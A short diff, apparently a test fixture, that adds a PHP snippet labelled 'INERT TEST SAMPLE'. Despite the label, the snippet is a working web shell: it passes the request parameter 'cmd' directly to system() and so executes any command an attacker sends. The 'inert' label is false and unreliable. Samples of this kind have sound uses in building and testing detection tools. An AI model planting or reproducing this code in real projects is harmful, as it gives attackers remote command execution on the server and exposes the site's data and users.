@@ -1,0 +1,4 @@
+// INERT TEST SAMPLE
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+
